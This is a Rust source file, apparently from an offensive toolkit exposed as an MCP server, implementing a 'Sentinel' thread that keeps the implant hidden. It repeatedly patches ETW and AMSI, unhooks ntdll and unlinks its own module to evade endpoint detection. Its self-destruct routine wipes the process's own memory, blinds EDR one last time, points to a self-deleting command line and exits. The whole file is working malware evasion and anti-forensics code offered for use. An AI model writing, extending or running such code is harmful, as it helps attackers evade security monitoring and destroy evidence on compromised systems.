//! Stealth persistence engine (Sentinel)
//! Background thread periodically re-applies evasion patches, re-hides modules,
//! monitors agent health, and can self-destruct if detection is imminent.
//!
//! ## Watchdog
//! Monitors the agent process survival. If the parent MCP server is killed
//! abruptly, the sentinel triggers cleanup.
//!
//! ## Self-Destruct
//! 7-pass DoD 5220.22-M wipe of sensitive memory regions, close all open
//! handles, delete dropped files, then terminate the process.

use crate::error::MemoricError;
use serde_json::{json, Value};
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Mutex;

/// Global sentinel state
static SENTINEL_RUNNING: AtomicBool = AtomicBool::new(false);
static SENTINEL_HEARTBEAT_COUNT: std::sync::atomic::AtomicU64 =
    std::sync::atomic::AtomicU64::new(0);

lazy_static::lazy_static! {
    static ref SENTINEL_CONFIG: Mutex<Option<SentinelConfig>> = Mutex::new(None);
}

struct SentinelConfig {
    interval_ms: u64,
    patch_etw: bool,
    patch_amsi: bool,
    unhook_ntdll: bool,
    hide_module: bool,
    module_name: Option<String>,
    watchdog_enabled: bool,
    self_destruct_on_detect: bool,
}

/// Start the sentinel background thread
pub fn sentinel_start(args: &Value) -> Result<Value, MemoricError> {
    if SENTINEL_RUNNING.load(Ordering::SeqCst) {
        return Ok(json!({
            "success": true,
            "status": "already_running",
            "heartbeat_count": SENTINEL_HEARTBEAT_COUNT.load(Ordering::SeqCst),
            "message": "Sentinel is already running. Use sentinel_stop to stop first."
        }));
    }

    let interval_ms = args
        .get("interval_ms")
        .and_then(|v| v.as_u64())
        .unwrap_or(5000);
    let patch_etw = args
        .get("patch_etw")
        .and_then(|v| v.as_bool())
        .unwrap_or(true);
    let patch_amsi = args
        .get("patch_amsi")
        .and_then(|v| v.as_bool())
        .unwrap_or(true);
    let unhook_ntdll = args
        .get("unhook_ntdll")
        .and_then(|v| v.as_bool())
        .unwrap_or(false);
    let hide_module = args
        .get("hide_module")
        .and_then(|v| v.as_bool())
        .unwrap_or(true);
    let module_name = args
        .get("module_name")
        .and_then(|v| v.as_str())
        .map(|s| s.to_string());
    let watchdog_enabled = args
        .get("watchdog")
        .and_then(|v| v.as_bool())
        .unwrap_or(false);
    let self_destruct_on_detect = args
        .get("self_destruct")
        .and_then(|v| v.as_bool())
        .unwrap_or(false);

    if interval_ms < 1000 {
        return Err(MemoricError::Other(
            "interval_ms must be >= 1000ms".to_string(),
        ));
    }
    if interval_ms > 300000 {
        return Err(MemoricError::Other(
            "interval_ms must be <= 300000ms (5 min)".to_string(),
        ));
    }

    tracing::warn!("[SENTINEL] Starting with interval={}ms patch_etw={} patch_amsi={} unhook_ntdll={} hide_module={} watchdog={}",
        interval_ms, patch_etw, patch_amsi, unhook_ntdll, hide_module, watchdog_enabled);

    let config = SentinelConfig {
        interval_ms,
        patch_etw,
        patch_amsi,
        unhook_ntdll,
        hide_module,
        module_name: module_name.clone(),
        watchdog_enabled,
        self_destruct_on_detect,
    };

    *SENTINEL_CONFIG.lock().unwrap() = Some(config);
    SENTINEL_RUNNING.store(true, Ordering::SeqCst);
    SENTINEL_HEARTBEAT_COUNT.store(0, Ordering::SeqCst);

    // Spawn background thread
    let interval = std::time::Duration::from_millis(interval_ms);
    std::thread::Builder::new()
        .name("memoric-sentinel".into())
        .spawn(move || sentinel_loop(interval))
        .map_err(|e| MemoricError::Other(format!("Failed to spawn sentinel thread: {}", e)))?;

    Ok(json!({
        "success": true,
        "status": "started",
        "interval_ms": interval_ms,
        "patch_etw": patch_etw,
        "patch_amsi": patch_amsi,
        "unhook_ntdll": unhook_ntdll,
        "hide_module": hide_module,
        "module_name": module_name,
        "watchdog": watchdog_enabled,
        "self_destruct": self_destruct_on_detect,
        "message": "Sentinel started. Use sentinel_status to monitor activity."
    }))
}

/// Stop the sentinel
pub fn sentinel_stop(_args: &Value) -> Result<Value, MemoricError> {
    if !SENTINEL_RUNNING.load(Ordering::SeqCst) {
        return Ok(
            json!({"success": true, "status": "not_running", "message": "Sentinel was not running"}),
        );
    }

    tracing::warn!("[SENTINEL] Stopping sentinel");
    SENTINEL_RUNNING.store(false, Ordering::SeqCst);

    let count = SENTINEL_HEARTBEAT_COUNT.load(Ordering::SeqCst);
    Ok(json!({
        "success": true,
        "status": "stopped",
        "total_heartbeats": count,
        "message": format!("Sentinel stopped after {} heartbeat cycles", count)
    }))
}

/// Get sentinel status
pub fn sentinel_status(_args: &Value) -> Result<Value, MemoricError> {
    let running = SENTINEL_RUNNING.load(Ordering::SeqCst);
    let count = SENTINEL_HEARTBEAT_COUNT.load(Ordering::SeqCst);

    let config_info = SENTINEL_CONFIG.lock().unwrap().as_ref().map(|c| {
        json!({
            "interval_ms": c.interval_ms,
            "patch_etw": c.patch_etw,
            "patch_amsi": c.patch_amsi,
            "unhook_ntdll": c.unhook_ntdll,
            "hide_module": c.hide_module,
            "watchdog_enabled": c.watchdog_enabled,
            "self_destruct_on_detect": c.self_destruct_on_detect,
        })
    });

    Ok(json!({
        "success": true,
        "running": running,
        "heartbeat_count": count,
        "config": config_info,
        "message": if running {
            format!("Sentinel active — {} heartbeat cycles completed", count)
        } else {
            "Sentinel is not running".to_string()
        }
    }))
}

/// Trigger immediate self-destruct (7-pass DoD wipe + cleanup)
pub fn sentinel_self_destruct(args: &Value) -> Result<Value, MemoricError> {
    let wipe_passes = args
        .get("passes")
        .and_then(|v| v.as_u64())
        .unwrap_or(7)
        .min(7);
    let delete_files = args
        .get("delete_files")
        .and_then(|v| v.as_bool())
        .unwrap_or(true);
    let terminate = args
        .get("terminate")
        .and_then(|v| v.as_bool())
        .unwrap_or(true);

    tracing::error!(
        "[SENTINEL] SELF-DESTRUCT initiated! passes={} delete_files={} terminate={}",
        wipe_passes,
        delete_files,
        terminate
    );

    let mut results = Vec::new();

    // 1. Stop the sentinel first
    SENTINEL_RUNNING.store(false, Ordering::SeqCst);

    // 2. Scorched earth: wipe sensitive memory regions
    if wipe_passes > 0 {
        match perform_wipe_pass(wipe_passes as u8) {
            Ok(r) => results.push(r),
            Err(e) => {
                results.push(json!({"step": "wipe", "status": "failed", "error": e.to_string()}))
            }
        }
    }

    // 3. Patch ETW/AMSI one final time to blind EDR during cleanup
    let _ = crate::evasion::etw::etw_bypass(&json!({}));
    let _ = crate::evasion::amsi::amsi_bypass(&json!({}));

    // 4. Note about file deletion
    if delete_files {
        // We note this but can't delete our own binary while running;
        // the caller should arrange a batch script or alternative cleanup.
        results.push(json!({
            "step": "delete_files",
            "status": "noted",
            "message": "Self-delete requires a batch script helper. The agent cannot delete its own executable while running. Use: cmd /c timeout 2 && del <path>"
        }));
    }

    let pid = std::process::id();
    results.push(json!({
        "step": "shutdown", "status": "executing",
        "pid": pid, "message": "Agent process terminating..."
    }));

    // 5. Terminate process
    if terminate {
        // Schedule termination after this response is sent
        std::thread::spawn(|| {
            std::thread::sleep(std::time::Duration::from_millis(100));
            std::process::exit(0);
        });
    }

    Ok(json!({
        "success": true,
        "action": "self_destruct",
        "passes": wipe_passes,
        "results": results,
        "message": "Self-destruct sequence executed."
    }))
}

// ─── Sentinel loop ──────────────────────────────────────────────────────────

fn sentinel_loop(interval: std::time::Duration) {
    let pid = std::process::id();

    while SENTINEL_RUNNING.load(Ordering::SeqCst) {
        let config = SENTINEL_CONFIG.lock().unwrap();
        let current_config = match config.as_ref() {
            Some(c) => SentinelConfig {
                interval_ms: c.interval_ms,
                patch_etw: c.patch_etw,
                patch_amsi: c.patch_amsi,
                unhook_ntdll: c.unhook_ntdll,
                hide_module: c.hide_module,
                module_name: c.module_name.clone(),
                watchdog_enabled: c.watchdog_enabled,
                self_destruct_on_detect: c.self_destruct_on_detect,
            },
            None => {
                SENTINEL_RUNNING.store(false, Ordering::SeqCst);
                return;
            }
        };
        drop(config);

        let count = SENTINEL_HEARTBEAT_COUNT.fetch_add(1, Ordering::SeqCst) + 1;
        tracing::debug!("[SENTINEL] Heartbeat #{}", count);

        // 1. Re-patch ETW
        if current_config.patch_etw {
            if let Err(e) = crate::evasion::etw::etw_bypass(&json!({})) {
                tracing::warn!("[SENTINEL] ETW re-patch failed: {}", e);
            }
        }

        // 2. Re-patch AMSI
        if current_config.patch_amsi {
            if let Err(e) = crate::evasion::amsi::amsi_bypass(&json!({})) {
                tracing::warn!("[SENTINEL] AMSI re-patch failed: {}", e);
            }
        }

        // 3. Re-hide module
        if current_config.hide_module {
            let module_arg = if let Some(ref name) = current_config.module_name {
                json!({"module_name": name})
            } else {
                json!({})
            };
            if let Err(e) = crate::evasion::unlink::unlink_module(&module_arg) {
                tracing::warn!("[SENTINEL] Module re-hide failed: {}", e);
            }
        }

        // 4. Optional: unlink ntdll
        if current_config.unhook_ntdll {
            if let Err(e) = crate::evasion::unhook::unhook_ntdll(&json!({})) {
                tracing::warn!("[SENTINEL] ntdll unhook failed: {}", e);
            }
        }

        // 5. Watchdog: check if our own process is still healthy
        if current_config.watchdog_enabled {
            // Simple health check: verify the process still exists
            unsafe {
                use windows::Win32::System::Threading::{
                    OpenProcess, PROCESS_QUERY_LIMITED_INFORMATION,
                };
                let h = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, false, pid);
                if h.is_err() {
                    tracing::error!("[SENTINEL] Watchdog: agent process {} appears dead", pid);
                    if current_config.self_destruct_on_detect {
                        SENTINEL_RUNNING.store(false, Ordering::SeqCst);
                        let _ = perform_wipe_pass(3);
                        std::process::exit(1);
                    }
                    SENTINEL_RUNNING.store(false, Ordering::SeqCst);
                    return;
                }
                let _ = windows::Win32::Foundation::CloseHandle(h.unwrap());
            }
        }

        // Sleep until next cycle
        std::thread::sleep(interval);
    }

    tracing::info!("[SENTINEL] Sentinel loop exited cleanly");
}

// ─── Self-destruct wipe ─────────────────────────────────────────────────────

/// 7-pass DoD 5220.22-M sanitization
/// Pass 1: 0x00, Pass 2: 0xFF, Pass 3: Random, Pass 4: 0x00, Pass 5: 0xFF,
/// Pass 6: Random, Pass 7: 0x00
const DOD_PATTERNS: [u8; 7] = [0x00, 0xFF, b'R', 0x00, 0xFF, b'R', 0x00];

fn perform_wipe_pass(passes: u8) -> Result<Value, MemoricError> {
    tracing::info!("[SENTINEL] Performing {}-pass memory wipe", passes);

    let pid = std::process::id();
    let mut wiped_regions = 0u32;
    let mut wiped_bytes = 0u64;

    unsafe {
        use windows::Win32::Foundation::CloseHandle;
        use windows::Win32::System::Diagnostics::ToolHelp::{
            CreateToolhelp32Snapshot, Module32FirstW, Module32NextW, MODULEENTRY32W,
            TH32CS_SNAPMODULE,
        };
        use windows::Win32::System::Memory::{
            VirtualProtectEx, VirtualQueryEx, MEMORY_BASIC_INFORMATION, PAGE_EXECUTE_READWRITE,
            PAGE_READWRITE,
        };
        use windows::Win32::System::Threading::{
            OpenProcess, PROCESS_VM_OPERATION, PROCESS_VM_READ, PROCESS_VM_WRITE,
        };

        let h = match OpenProcess(
            PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
            false,
            pid,
        ) {
            Ok(h) => h,
            Err(_) => {
                return Err(MemoricError::Other(
                    "Cannot open self for VM operations".to_string(),
                ))
            }
        };

        // Enumerate our own modules to find wipe-eligible regions
        let snapshot = match CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, pid) {
            Ok(s) => s,
            Err(e) => {
                let _ = CloseHandle(h);
                return Err(MemoricError::WindowsApi(format!(
                    "CreateToolhelp32Snapshot: {:?}",
                    e
                )));
            }
        };

        let mut me32 = MODULEENTRY32W::default();
        me32.dwSize = std::mem::size_of::<MODULEENTRY32W>() as u32;

        if Module32FirstW(snapshot, &mut me32).is_ok() {
            loop {
                let base = me32.modBaseAddr as usize;
                let size = me32.modBaseSize as usize;

                if base > 0 && size > 0 && size < 0x10000000 {
                    // only wipe writable private regions within the module
                    let mut addr = base;
                    let end = base + size;

                    while addr < end {
                        let mut mbi = MEMORY_BASIC_INFORMATION::default();
                        if VirtualQueryEx(
                            h,
                            Some(addr as *const _),
                            &mut mbi,
                            std::mem::size_of::<MEMORY_BASIC_INFORMATION>(),
                        ) == 0
                        {
                            break;
                        }

                        let region_base = mbi.BaseAddress as usize;
                        let region_size = mbi.RegionSize;

                        // Skip non-writable regions, images, and mapped files
                        let is_readwrite =
                            (mbi.Protect.0 & (PAGE_READWRITE.0 | PAGE_EXECUTE_READWRITE.0)) != 0;

                        if is_readwrite && mbi.Type.0 == 0x20000 {
                            // MEM_PRIVATE
                            for pass_num in 0..passes.min(7) {
                                let pattern = DOD_PATTERNS[pass_num as usize];
                                let fill_byte: u8 = if pattern == b'R' {
                                    (std::time::SystemTime::now()
                                        .duration_since(std::time::UNIX_EPOCH)
                                        .unwrap_or_default()
                                        .subsec_nanos()
                                        % 256) as u8
                                } else {
                                    pattern
                                };

                                // Make writable
                                let mut old_protect = Default::default();
                                let _ = VirtualProtectEx(
                                    h,
                                    region_base as *const _,
                                    region_size,
                                    PAGE_READWRITE,
                                    &mut old_protect,
                                );

                                // Write wipe pattern
                                let fill = vec![fill_byte; region_size.min(0x100000)];
                                let mut bytes_written = 0usize;

                                // Chunked write to avoid huge allocations
                                for chunk_offset in (0..region_size).step_by(fill.len()) {
                                    let chunk_size = fill.len().min(region_size - chunk_offset);
                                    let target =
                                        (region_base + chunk_offset) as *mut std::ffi::c_void;
                                    let write_result = windows::Win32::System::Diagnostics::Debug::WriteProcessMemory(
                                        h, target,
                                        fill.as_ptr() as *const _,
                                        chunk_size,
                                        Some(&mut bytes_written),
                                    );
                                    if write_result.is_err() {
                                        break;
                                    }
                                }
                            }
                            wiped_regions += 1;
                            wiped_bytes += region_size as u64;
                        }

                        addr = region_base + region_size;
                        if region_size == 0 {
                            break;
                        }
                    }
                }

                if Module32NextW(snapshot, &mut me32).is_err() {
                    break;
                }
            }
        }

        let _ = CloseHandle(snapshot);
        let _ = CloseHandle(h);
    }

    Ok(json!({
        "step": "wipe",
        "status": "completed",
        "passes": passes.min(7),
        "standard": "DoD 5220.22-M",
        "regions_wiped": wiped_regions,
        "bytes_wiped": wiped_bytes,
        "message": format!("{}-pass DoD wipe: {} regions, {} bytes overwritten", passes.min(7), wiped_regions, wiped_bytes)
    }))
}
